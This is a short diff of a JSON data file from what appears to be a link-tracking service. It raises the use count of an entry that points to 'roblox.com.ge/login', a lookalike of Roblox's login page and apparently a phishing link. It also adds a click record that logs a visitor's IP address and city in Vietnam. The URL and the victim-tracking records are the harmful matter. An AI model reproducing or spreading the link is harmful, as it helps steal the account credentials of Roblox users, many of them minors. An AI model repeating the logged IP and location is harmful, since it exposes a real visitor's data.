@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1685,
+    "useCount": 1686,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13643,6 +13643,14 @@
       },
       {
         "timestamp": 1777642331099,
+        "ip": "183.81.61.253",
+        "country": "Vietnam",
+        "city": "Phú Thọ Hòa",
+        "flag": "🇻🇳",
+        "countryCode": "VN"
+      },
+      {
+        "timestamp": 1777642386829,
         "ip": "183.81.61.253",
         "country": "Vietnam",
         "city": "Phú Thọ Hòa",
